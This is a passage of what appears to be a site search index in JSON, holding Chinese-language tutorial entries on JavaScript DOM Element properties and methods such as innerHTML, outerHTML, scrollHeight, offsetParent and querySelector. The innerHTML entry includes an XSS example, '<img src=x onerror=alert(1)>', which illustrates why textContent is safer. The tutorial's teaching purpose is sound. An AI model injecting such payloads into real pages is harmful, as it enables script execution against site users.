\u3002\u5982\u679c\u60f3\u5f97\u5230\u539f\u6587\uff0c\u5efa\u8bae\u4f7f\u7528 element.textContent \u5c5e\u6027\u3002 1 2 3 // HTML\u4ee3\u7801\u5982\u4e0b <p id=\"para\"> 5 > 3 </p> document . getElementById ( 'para' ). innerHTML // 5 &gt; 3 \u5199\u5165\u7684\u65f6\u5019\uff0c\u5982\u679c\u63d2\u5165\u7684\u6587\u672c\u5305\u542b HTML \u6807\u7b7e\uff0c\u4f1a\u88ab\u89e3\u6790\u6210\u4e3a\u8282\u70b9\u5bf9\u8c61\u63d2\u5165 DOM\u3002\u6ce8\u610f\uff0c\u5982\u679c\u6587\u672c\u4e4b\u4e2d\u542b\u6709 <script> \u6807\u7b7e\uff0c\u867d\u7136\u53ef\u4ee5\u751f\u6210 script \u8282\u70b9\uff0c\u4f46\u662f\u63d2\u5165\u7684\u4ee3\u7801\u4e0d\u4f1a\u6267\u884c\u3002 1 2 var name = \"<script>alert('haha')</script>\" ; el . innerHTML = name ; \u4e0a\u9762\u4ee3\u7801\u5c06\u811a\u672c\u63d2\u5165\u5185\u5bb9\uff0c\u811a\u672c\u5e76\u4e0d\u4f1a\u6267\u884c\u3002\u4f46\u662f\uff0c innerHTML \u8fd8\u662f\u6709\u5b89\u5168\u98ce\u9669\u7684\u3002 1 2 var name = \"<img src=x onerror=alert(1)>\" ; el . innerHTML = name ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c alert \u65b9\u6cd5\u662f\u4f1a\u6267\u884c\u7684\u3002\u56e0\u6b64\u4e3a\u4e86\u5b89\u5168\u8003\u8651\uff0c\u5982\u679c\u63d2\u5165\u7684\u662f\u6587\u672c\uff0c\u6700\u597d\u7528 textContent \u5c5e\u6027\u4ee3\u66ff innerHTML \u3002","title":"Element.innerHTML"},{"location":"dom/element/#elementouterhtml","text":"Element.outerHTML \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709 HTML \u4ee3\u7801\uff0c\u5305\u62ec\u8be5\u5143\u7d20\u672c\u8eab\u548c\u6240\u6709\u5b50\u5143\u7d20\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"d\"><p>Hello</p></div> var d = document . getElementById ( 'd' ); d . outerHTML // '<div id=\"d\"><p>Hello</p></div>' outerHTML \u5c5e\u6027\u662f\u53ef\u8bfb\u5199\u7684\uff0c\u5bf9\u5b83\u8fdb\u884c\u8d4b\u503c\uff0c\u7b49\u4e8e\u66ff\u6362\u6389\u5f53\u524d\u5143\u7d20\u3002 1 2 3 4 5 6 7 8 9 10 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"container\"><div id=\"d\">Hello</div></div> var container = document . getElementById ( 'container' ); var d = document . getElementById ( 'd' ); container . firstChild . nodeName // \"DIV\" d . nodeName // \"DIV\" d . outerHTML = '<p>Hello</p>' ; container . firstChild . nodeName // \"P\" d . nodeName // \"DIV\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf d \u4ee3\u8868\u5b50\u8282\u70b9\uff0c\u5b83\u7684 outerHTML \u5c5e\u6027\u91cd\u65b0\u8d4b\u503c\u4ee5\u540e\uff0c\u5185\u5c42\u7684 div \u5143\u7d20\u5c31\u4e0d\u5b58\u5728\u4e86\uff0c\u88ab p \u5143\u7d20\u66ff\u6362\u4e86\u3002\u4f46\u662f\uff0c\u53d8\u91cf d \u4f9d\u7136\u6307\u5411\u539f\u6765\u7684 div \u5143\u7d20\uff0c\u8fd9\u8868\u793a\u88ab\u66ff\u6362\u7684 DIV \u5143\u7d20\u8fd8\u5b58\u5728\u4e8e\u5185\u5b58\u4e2d\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u4e00\u4e2a\u8282\u70b9\u6ca1\u6709\u7236\u8282\u70b9\uff0c\u8bbe\u7f6e outerHTML \u5c5e\u6027\u4f1a\u62a5\u9519\u3002 1 2 3 var div = document . createElement ( 'div' ); div . outerHTML = '<p>test</p>' ; // DOMException: This element has no parent node. \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c div \u5143\u7d20\u6ca1\u6709\u7236\u8282\u70b9\uff0c\u8bbe\u7f6e outerHTML \u5c5e\u6027\u4f1a\u62a5\u9519\u3002","title":"Element.outerHTML"},{"location":"dom/element/#elementclientheightelementclientwidth","text":"Element.clientHeight \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u5143\u7d20\u8282\u70b9\u7684 CSS \u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u53ea\u5bf9\u5757\u7ea7\u5143\u7d20\u751f\u6548\uff0c\u5bf9\u4e8e\u884c\u5185\u5143\u7d20\u8fd4\u56de 0 \u3002\u5982\u679c\u5757\u7ea7\u5143\u7d20\u6ca1\u6709\u8bbe\u7f6e CSS \u9ad8\u5ea6\uff0c\u5219\u8fd4\u56de\u5b9e\u9645\u9ad8\u5ea6\u3002 \u9664\u4e86\u5143\u7d20\u672c\u8eab\u7684\u9ad8\u5ea6\uff0c\u5b83\u8fd8\u5305\u62ec padding \u90e8\u5206\uff0c\u4f46\u662f\u4e0d\u5305\u62ec border \u3001 margin \u3002\u5982\u679c\u6709\u6c34\u5e73\u6eda\u52a8\u6761\uff0c\u8fd8\u8981\u51cf\u53bb\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\u3002\u6ce8\u610f\uff0c\u8fd9\u4e2a\u503c\u59cb\u7ec8\u662f\u6574\u6570\uff0c\u5982\u679c\u662f\u5c0f\u6570\u4f1a\u88ab\u56db\u820d\u4e94\u5165\u3002 Element.clientWidth \u5c5e\u6027\u8fd4\u56de\u5143\u7d20\u8282\u70b9\u7684 CSS \u5bbd\u5ea6\uff0c\u540c\u6837\u53ea\u5bf9\u5757\u7ea7\u5143\u7d20\u6709\u6548\uff0c\u4e5f\u662f\u53ea\u5305\u62ec\u5143\u7d20\u672c\u8eab\u7684\u5bbd\u5ea6\u548c padding \uff0c\u5982\u679c\u6709\u5782\u76f4\u6eda\u52a8\u6761\uff0c\u8fd8\u8981\u51cf\u53bb\u5782\u76f4\u6eda\u52a8\u6761\u7684\u5bbd\u5ea6\u3002 document.documentElement \u7684 clientHeight \u5c5e\u6027\uff0c\u8fd4\u56de\u5f53\u524d\u89c6\u53e3\u7684\u9ad8\u5ea6\uff08\u5373\u6d4f\u89c8\u5668\u7a97\u53e3\u7684\u9ad8\u5ea6\uff09\uff0c\u7b49\u540c\u4e8e window.innerHeight \u5c5e\u6027\u51cf\u53bb\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09\u3002 document.body \u7684\u9ad8\u5ea6\u5219\u662f\u7f51\u9875\u7684\u5b9e\u9645\u9ad8\u5ea6\u3002\u4e00\u822c\u6765\u8bf4\uff0c document.body.clientHeight \u5927\u4e8e document.documentElement.clientHeight \u3002 1 2 3 4 5 // \u89c6\u53e3\u9ad8\u5ea6 document . documentElement . clientHeight // \u7f51\u9875\u603b\u9ad8\u5ea6 document . body . clientHeight","title":"Element.clientHeight\uff0cElement.clientWidth"},{"location":"dom/element/#elementclientleftelementclienttop","text":"Element.clientLeft \u5c5e\u6027\u7b49\u4e8e\u5143\u7d20\u8282\u70b9\u5de6\u8fb9\u6846\uff08left border\uff09\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u4e0d\u5305\u62ec\u5de6\u4fa7\u7684 padding \u548c margin \u3002\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u5de6\u8fb9\u6846\uff0c\u6216\u8005\u662f\u884c\u5185\u5143\u7d20\uff08 display: inline \uff09\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de 0 \u3002\u8be5\u5c5e\u6027\u603b\u662f\u8fd4\u56de\u6574\u6570\u503c\uff0c\u5982\u679c\u662f\u5c0f\u6570\uff0c\u4f1a\u56db\u820d\u4e94\u5165\u3002 Element.clientTop \u5c5e\u6027\u7b49\u4e8e\u7f51\u9875\u5143\u7d20\u9876\u90e8\u8fb9\u6846\u7684\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u7279\u70b9\u90fd\u4e0e clientLeft \u76f8\u540c\u3002","title":"Element.clientLeft\uff0cElement.clientTop"},{"location":"dom/element/#elementscrollheightelementscrollwidth","text":"Element.scrollHeight \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff08\u5c0f\u6570\u4f1a\u56db\u820d\u4e94\u5165\uff09\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u603b\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5305\u62ec\u6ea2\u51fa\u5bb9\u5668\u3001\u5f53\u524d\u4e0d\u53ef\u89c1\u7684\u90e8\u5206\u3002\u5b83\u5305\u62ec padding \uff0c\u4f46\u662f\u4e0d\u5305\u62ec border \u3001 margin \u4ee5\u53ca\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\uff08\u5982\u679c\u6709\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u8bdd\uff09\uff0c\u8fd8\u5305\u62ec\u4f2a\u5143\u7d20\uff08 ::before \u6216 ::after \uff09\u7684\u9ad8\u5ea6\u3002 Element.scrollWidth \u5c5e\u6027\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u603b\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u5730\u65b9\u90fd\u4e0e scrollHeight \u5c5e\u6027\u7c7b\u4f3c\u3002\u8fd9\u4e24\u4e2a\u5c5e\u6027\u53ea\u8bfb\u3002 \u6574\u5f20\u7f51\u9875\u7684\u603b\u9ad8\u5ea6\u53ef\u4ee5\u4ece document.documentElement \u6216 document.body \u4e0a\u8bfb\u53d6\u3002 1 2 3 // \u8fd4\u56de\u7f51\u9875\u7684\u603b\u9ad8\u5ea6 document . documentElement . scrollHeight document . body . scrollHeight \u6ce8\u610f\uff0c\u5982\u679c\u5143\u7d20\u8282\u70b9\u7684\u5185\u5bb9\u51fa\u73b0\u6ea2\u51fa\uff0c\u5373\u4f7f\u6ea2\u51fa\u7684\u5185\u5bb9\u662f\u9690\u85cf\u7684\uff0c scrollHeight \u5c5e\u6027\u4ecd\u7136\u8fd4\u56de\u5143\u7d20\u7684\u603b\u9ad8\u5ea6\u3002 1 2 3 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"myDiv\" style=\"height: 200px; overflow: hidden;\">...<div> document . getElementById ( 'myDiv' ). scrollHeight // 356 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5373\u4f7f myDiv \u5143\u7d20\u7684 CSS \u9ad8\u5ea6\u53ea\u6709200\u50cf\u7d20\uff0c\u4e14\u6ea2\u51fa\u90e8\u5206\u4e0d\u53ef\u89c1\uff0c\u4f46\u662f scrollHeight \u4ecd\u7136\u4f1a\u8fd4\u56de\u8be5\u5143\u7d20\u7684\u539f\u59cb\u9ad8\u5ea6\u3002","title":"Element.scrollHeight\uff0cElement.scrollWidth"},{"location":"dom/element/#elementscrollleftelementscrolltop","text":"Element.scrollLeft \u5c5e\u6027\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u6c34\u5e73\u6eda\u52a8\u6761\u5411\u53f3\u4fa7\u6eda\u52a8\u7684\u50cf\u7d20\u6570\u91cf\uff0c Element.scrollTop \u5c5e\u6027\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u5782\u76f4\u6eda\u52a8\u6761\u5411\u4e0b\u6eda\u52a8\u7684\u50cf\u7d20\u6570\u91cf\u3002\u5bf9\u4e8e\u90a3\u4e9b\u6ca1\u6709\u6eda\u52a8\u6761\u7684\u7f51\u9875\u5143\u7d20\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u603b\u662f\u7b49\u4e8e0\u3002 \u5982\u679c\u8981\u67e5\u770b\u6574\u5f20\u7f51\u9875\u7684\u6c34\u5e73\u7684\u548c\u5782\u76f4\u7684\u6eda\u52a8\u8ddd\u79bb\uff0c\u8981\u4ece document.documentElement \u5143\u7d20\u4e0a\u8bfb\u53d6\u3002 1 2 document . documentElement . scrollLeft document . documentElement . scrollTop \u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u53ef\u8bfb\u5199\uff0c\u8bbe\u7f6e\u8be5\u5c5e\u6027\u7684\u503c\uff0c\u4f1a\u5bfc\u81f4\u6d4f\u89c8\u5668\u5c06\u5f53\u524d\u5143\u7d20\u81ea\u52a8\u6eda\u52a8\u5230\u76f8\u5e94\u7684\u4f4d\u7f6e\u3002","title":"Element.scrollLeft\uff0cElement.scrollTop"},{"location":"dom/element/#elementoffsetparent","text":"Element.offsetParent \u5c5e\u6027\u8fd4\u56de\u6700\u9760\u8fd1\u5f53\u524d\u5143\u7d20\u7684\u3001\u5e76\u4e14 CSS \u7684 position \u5c5e\u6027\u4e0d\u7b49\u4e8e static \u7684\u4e0a\u5c42\u5143\u7d20\u3002 1 2 3 4 5 < div style = \"position: absolute;\" > < p > < span > Hello </ span > </ p > </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c span \u5143\u7d20\u7684 offsetParent \u5c5e\u6027\u5c31\u662f div \u5143\u7d20\u3002 \u8be5\u5c5e\u6027\u4e3b\u8981\u7528\u4e8e\u786e\u5b9a\u5b50\u5143\u7d20\u4f4d\u7f6e\u504f\u79fb\u7684\u8ba1\u7b97\u57fa\u51c6\uff0c Element.offsetTop \u548c Element.offsetLeft \u5c31\u662f offsetParent \u5143\u7d20\u8ba1\u7b97\u7684\u3002 \u5982\u679c\u8be5\u5143\u7d20\u662f\u4e0d\u53ef\u89c1\u7684\uff08 display \u5c5e\u6027\u4e3a none \uff09\uff0c\u6216\u8005\u4f4d\u7f6e\u662f\u56fa\u5b9a\u7684\uff08 position \u5c5e\u6027\u4e3a fixed \uff09\uff0c\u5219 offsetParent \u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 4 5 < div style = \"position: absolute;\" > < p > < span style = \"display: none;\" > Hello </ span > </ p > </ div > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c span \u5143\u7d20\u7684 offsetParent \u5c5e\u6027\u662f null \u3002 \u5982\u679c\u67d0\u4e2a\u5143\u7d20\u7684\u6240\u6709\u4e0a\u5c42\u8282\u70b9\u7684 position \u5c5e\u6027\u90fd\u662f static \uff0c\u5219 Element.offsetParent \u5c5e\u6027\u6307\u5411 <body> \u5143\u7d20\u3002","title":"Element.offsetParent"},{"location":"dom/element/#elementoffsetheightelementoffsetwidth","text":"Element.offsetHeight \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u5143\u7d20\u7684 CSS \u5782\u76f4\u9ad8\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5305\u62ec\u5143\u7d20\u672c\u8eab\u7684\u9ad8\u5ea6\u3001padding \u548c border\uff0c\u4ee5\u53ca\u6c34\u5e73\u6eda\u52a8\u6761\u7684\u9ad8\u5ea6\uff08\u5982\u679c\u5b58\u5728\u6eda\u52a8\u6761\uff09\u3002 Element.offsetWidth \u5c5e\u6027\u8868\u793a\u5143\u7d20\u7684 CSS \u6c34\u5e73\u5bbd\u5ea6\uff08\u5355\u4f4d\u50cf\u7d20\uff09\uff0c\u5176\u4ed6\u90fd\u4e0e Element.offsetHeight \u4e00\u81f4\u3002 \u8fd9\u4e24\u4e2a\u5c5e\u6027\u90fd\u662f\u53ea\u8bfb\u5c5e\u6027\uff0c\u53ea\u6bd4 Element.clientHeight \u548c Element.clientWidth \u591a\u4e86\u8fb9\u6846\u7684\u9ad8\u5ea6\u6216\u5bbd\u5ea6\u3002\u5982\u679c\u5143\u7d20\u7684 CSS \u8bbe\u4e3a\u4e0d\u53ef\u89c1\uff08\u6bd4\u5982 display: none; \uff09\uff0c\u5219\u8fd4\u56de 0 \u3002","title":"Element.offsetHeight\uff0cElement.offsetWidth"},{"location":"dom/element/#elementoffsetleftelementoffsettop","text":"Element.offsetLeft \u8fd4\u56de\u5f53\u524d\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e Element.offsetParent \u8282\u70b9\u7684\u6c34\u5e73\u4f4d\u79fb\uff0c Element.offsetTop \u8fd4\u56de\u5782\u76f4\u4f4d\u79fb\uff0c\u5355\u4f4d\u4e3a\u50cf\u7d20\u3002\u901a\u5e38\uff0c\u8fd9\u4e24\u4e2a\u503c\u662f\u6307\u76f8\u5bf9\u4e8e\u7236\u8282\u70b9\u7684\u4f4d\u79fb\u3002 \u4e0b\u9762\u7684\u4ee3\u7801\u53ef\u4ee5\u7b97\u51fa\u5143\u7d20\u5de6\u4e0a\u89d2\u76f8\u5bf9\u4e8e\u6574\u5f20\u7f51\u9875\u7684\u5750\u6807\u3002 1 2 3 4 5 6 7 8 9 10 function getElementPosition ( e ) { var x = 0 ; var y = 0 ; while ( e !== null ) { x += e . offsetLeft ; y += e . offsetTop ; e = e . offsetParent ; } return { x : x , y : y }; }","title":"Element.offsetLeft\uff0cElement.offsetTop"},{"location":"dom/element/#elementstyle","text":"\u6bcf\u4e2a\u5143\u7d20\u8282\u70b9\u90fd\u6709 style \u7528\u6765\u8bfb\u5199\u8be5\u5143\u7d20\u7684\u884c\u5185\u6837\u5f0f\u4fe1\u606f\uff0c\u5177\u4f53\u4ecb\u7ecd\u53c2\u89c1\u300aCSS \u64cd\u4f5c\u300b\u4e00\u7ae0\u3002","title":"Element.style"},{"location":"dom/element/#elementchildrenelementchildelementcount","text":"Element.children \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 HTMLCollection \u5b9e\u4f8b\uff09\uff0c\u5305\u62ec\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709\u5b50\u5143\u7d20\u3002\u5982\u679c\u5f53\u524d\u5143\u7d20\u6ca1\u6709\u5b50\u5143\u7d20\uff0c\u5219\u8fd4\u56de\u7684\u5bf9\u8c61\u5305\u542b\u96f6\u4e2a\u6210\u5458\u3002 1 2 3 4 5 6 if ( para . children . length ) { var children = para . children ; for ( var i = 0 ; i < children . length ; i ++ ) { // ... } } \u4e0a\u9762\u4ee3\u7801\u904d\u5386\u4e86 para \u5143\u7d20\u7684\u6240\u6709\u5b50\u5143\u7d20\u3002 \u8fd9\u4e2a\u5c5e\u6027\u4e0e Node.childNodes \u5c5e\u6027\u7684\u533a\u522b\u662f\uff0c\u5b83\u53ea\u5305\u62ec\u5143\u7d20\u7c7b\u578b\u7684\u5b50\u8282\u70b9\uff0c\u4e0d\u5305\u62ec\u5176\u4ed6\u7c7b\u578b\u7684\u5b50\u8282\u70b9\u3002 Element.childElementCount \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u8282\u70b9\u5305\u542b\u7684\u5b50\u5143\u7d20\u8282\u70b9\u7684\u4e2a\u6570\uff0c\u4e0e Element.children.length \u7684\u503c\u76f8\u540c\u3002","title":"Element.children\uff0cElement.childElementCount"},{"location":"dom/element/#elementfirstelementchildelementlastelementchild","text":"Element.firstElementChild \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\uff0c Element.lastElementChild \u8fd4\u56de\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u5b50\u8282\u70b9\u3002 \u5982\u679c\u6ca1\u6709\u5143\u7d20\u5b50\u8282\u70b9\uff0c\u8fd9\u4e24\u4e2a\u5c5e\u6027\u8fd4\u56de null \u3002","title":"Element.firstElementChild\uff0cElement.lastElementChild"},{"location":"dom/element/#elementnextelementsiblingelementpreviouselementsibling","text":"Element.nextElementSibling \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u540e\u4e00\u4e2a\u540c\u7ea7\u5143\u7d20\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"div-01\">Here is div-01</div> // <div id=\"div-02\">Here is div-02</div> var el = document . getElementById ( 'div-01' ); el . nextElementSibling // <div id=\"div-02\">Here is div-02</div> Element.previousElementSibling \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u524d\u4e00\u4e2a\u540c\u7ea7\u5143\u7d20\u8282\u70b9\uff0c\u5982\u679c\u6ca1\u6709\u5219\u8fd4\u56de null \u3002","title":"Element.nextElementSibling\uff0cElement.previousElementSibling"},{"location":"dom/element/#_5","text":"","title":"\u5b9e\u4f8b\u65b9\u6cd5"},{"location":"dom/element/#_6","text":"\u5143\u7d20\u8282\u70b9\u63d0\u4f9b\u516d\u4e2a\u65b9\u6cd5\uff0c\u7528\u6765\u64cd\u4f5c\u5c5e\u6027\u3002 getAttribute() \uff1a\u8bfb\u53d6\u67d0\u4e2a\u5c5e\u6027\u7684\u503c getAttributeNames() \uff1a\u8fd4\u56de\u5f53\u524d\u5143\u7d20\u7684\u6240\u6709\u5c5e\u6027\u540d setAttribute() \uff1a\u5199\u5165\u5c5e\u6027\u503c hasAttribute() \uff1a\u67d0\u4e2a\u5c5e\u6027\u662f\u5426\u5b58\u5728 hasAttributes() \uff1a\u5f53\u524d\u5143\u7d20\u662f\u5426\u6709\u5c5e\u6027 removeAttribute() \uff1a\u5220\u9664\u5c5e\u6027 \u8fd9\u4e9b\u65b9\u6cd5\u7684\u4ecb\u7ecd\u8bf7\u770b\u300a\u5c5e\u6027\u7684\u64cd\u4f5c\u300b\u4e00\u7ae0\u3002","title":"\u5c5e\u6027\u76f8\u5173\u65b9\u6cd5"},{"location":"dom/element/#elementqueryselector","text":"Element.querySelector \u65b9\u6cd5\u63a5\u53d7 CSS \u9009\u62e9\u5668\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u7236\u5143\u7d20\u7684\u7b2c\u4e00\u4e2a\u5339\u914d\u7684\u5b50\u5143\u7d20\u3002\u5982\u679c\u6ca1\u6709\u627e\u5230\u5339\u914d\u7684\u5b50\u5143\u7d20\uff0c\u5c31\u8fd4\u56de null \u3002 1 2 var content = document . getElementById ( 'content' ); var el = content . querySelector ( 'p' ); \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de content \u8282\u70b9\u7684\u7b2c\u4e00\u4e2a p \u5143\u7d20\u3002 Element.querySelector \u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4efb\u4f55\u590d\u6742\u7684 CSS \u9009\u62e9\u5668\u3002 1 document . body . querySelector ( \"style[type='text/css'], style:not([type])\" ); \u6ce8\u610f\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u65e0\u6cd5\u9009\u4e2d\u4f2a\u5143\u7d20\u3002 \u5b83\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a\u9009\u62e9\u5668\uff0c\u5b83\u4eec\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002 1 element . querySelector ( 'div, p' ) \u4e0a\u9762\u4ee3\u7801\u8fd4\u56de element \u7684\u7b2c\u4e00\u4e2a div \u6216 p \u5b50\u5143\u7d20\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u6d4f\u89c8\u5668\u6267\u884c querySelector \u65b9\u6cd5\u65f6\uff0c\u662f\u5148\u5728\u5168\u5c40\u8303\u56f4\u5185\u641c\u7d22\u7ed9\u5b9a\u7684 CSS \u9009\u62e9\u5668\uff0c\u7136\u540e\u8fc7\u6ee4\u51fa\u54ea\u4e9b\u5c5e\u4e8e\u5f53\u524d\u5143\u7d20\u7684\u5b50\u5143\u7d20\u3002\u56e0\u6b64\uff0c\u4f1a\u6709\u4e00\u4e9b\u8fdd\u53cd\u76f4\u89c9\u7684\u7ed3\u679c\uff0c\u4e0b\u9762\u662f\u4e00\u6bb5 HTML \u4ee3\u7801\u3002 1 2 3 4 5 6 7 8 < div > < blockquote id = \"outer\" > < p > Hello </ p > < div id = \"inner\" > < p > World </ p > </ div > </ blockquote > </ div > \u90a3\u4e48\uff0c\u50cf\u4e0b\u9762\u8fd9\u6837\u67e5\u8be2\u7684\u8bdd\uff0c\u5b9e\u9645\u4e0a\u8fd4\u56de\u7684\u662f\u7b2c\u4e00\u4e2a p \u5143\u7d20\uff0c\u800c\u4e0d\u662f\u7b2c\u4e8c\u4e2a\u3002 1 2 3 var outer = document . getElementById ( 'outer' ); outer . querySelector ( 'div p' ) // <p>Hello</p>","title":"Element.querySelector()"},{"location":"dom/element/#elementqueryselectorall","text":"Element.querySelectorAll \u65b9\u6cd5\u63a5\u53d7 CSS \u9009\u62e9\u5668\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a NodeList \u5b9e\u4f8b\uff0c\u5305\u542b\u6240\u6709\u5339\u914d\u7684\u5b50\u5143\u7d20\u3002 1 2 var el = document . querySelector ( '#test' ); var matches = el . querySelectorAll ( 'div.highlighted > p' ); \u8be5\u65b9\u6cd5\u7684\u6267\u884c\u673a\u5236\u4e0e querySelector \u65b9\u6cd5\u76f8\u540c\uff0c\u4e5f\u662f\u5148\u5728\u5168\u5c40\u8303\u56f4\u5185\u67e5\u627e\uff0c\u518d\u8fc7\u6ee4\u51fa\u5f53\u524d\u5143\u7d20\u7684\u5b50\u5143\u7d20\u3002\u56e0\u6b64\uff0c\u9009\u62e9\u5668\u5b9e\u9645\u4e0a\u9488\u5bf9\u6574\u4e2a\u6587\u6863\u7684\u3002 \u5b83\u4e5f\u53ef\u4ee5\u63a5\u53d7\u591a\u4e2a CSS \u9009\u62e9\u5668\uff0c\u5b83\u4eec\u4e4b\u95f4\u4f7f\u7528\u9017\u53f7\u5206\u9694\u3002\u5982\u679c\u9009\u62e9\u5668\u91cc\u9762\u6709\u4f2a\u5143\u7d20\u7684\u9009\u62e9\u5668\uff0c\u5219\u603b\u662f\u8fd4\u56de\u4e00\u4e2a\u7a7a\u7684 NodeList \u5b9e\u4f8b\u3002","title":"Element.querySelectorAll()"},{"location":"dom/element/#elementgetelementsbyclassname","text":"Element.getElementsByClassName \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u5f53\u524d\u5143\u7d20\u8282\u70b9\u7684\u6240\u6709\u5177\u6709\u6307\u5b9a class \u7684\u5b50\u5143\u7d20\u8282\u70b9\u3002\u8be5\u65b9\u6cd5\u4e0e document.getElementsByClassName \u65b9\u6cd5\u7684\u7528\u6cd5\u7c7b\u4f3c\uff0c\u53ea\u662f\u641c\u7d22\u8303\u56f4\u4e0d\u662f\u6574\u4e2a\u6587\u6863\uff0c\u800c\u662f\u5f53\u524d\u5143\u7d20\u8282\u70b9\u3002 1 element . getElementsByClassName ( 'red test' ); \u6ce8\u610f\uff0c\u8be5\u65b9\u6cd5\u7684\u53c2\u6570\u5927\u5c0f\u5199\u654f\u611f\u3002 \u7531\u4e8e HTMLCollection \u5b9e\u4f8b\u662f\u4e00\u4e2a\u6d3b\u7684\u96c6\u5408\uff0c document \u5bf9\u8c61\u7684\u4efb\u4f55\u53d8\u5316\u4f1a\u7acb\u523b\u53cd\u5e94\u5230\u5b9e\u4f8b\uff0c\u4e0b\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u751f\u6548\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"example\"> // <p class=\"foo\"></p> // <p class=\"foo\"></p> // </div> var element = document . getElementById ( 'example' ); var matches = element . getElementsByClassName ( 'foo' ); for ( var i = 0 ; i < matches . length ; i ++ ) { matches [ i ]. classList . remove ( 'foo' ); matches . item ( i ). classList . add ( 'bar' ); } // \u6267\u884c\u540e\uff0cHTML \u4ee3\u7801\u5982\u4e0b // <div id=\"example\"> // <p></p> // <p class=\"foo bar\"></p> // </div> \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c matches \u96c6\u5408\u7684\u7b2c\u4e00\u4e2a\u6210\u5458\uff0c\u4e00\u65e6\u88ab\u62ff\u6389 class \u91cc\u9762\u7684 foo \uff0c\u5c31\u4f1a\u7acb\u523b\u4ece matches \u91cc\u9762\u6d88\u5931\uff0c\u5bfc\u81f4\u51fa\u73b0\u4e0a\u9762\u7684\u7ed3\u679c\u3002","title":"Element.getElementsByClassName()"},{"location":"dom/element/#elementgetelementsbytagname","text":"Element.getElementsByTagName() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a HTMLCollection \u5b9e\u4f8b\uff0c\u6210\u5458\u662f\u5f53\u524d\u8282\u70b9\u7684\u6240\u6709\u5339\u914d\u6307\u5b9a\u6807\u7b7e\u540d\u7684\u5b50\u5143\u7d20\u8282\u70b9\u3002\u8be5\u65b9\u6cd5\u4e0e document.getElementsByClassName() \u65b9\u6cd5\u7684\u7528\u6cd5\u7c7b\u4f3c\uff0c\u53ea\u662f\u641c\u7d22\u8303\u56f4\u4e0d\u662f\u6574\u4e2a\u6587\u6863\uff0c\u800c\u662f\u5f53\u524d\u5143\u7d20\u8282\u70b9\u3002 1 2 var table = document . getElementById ( 'forecast-table' ); var cells = table . getElementsByTagName 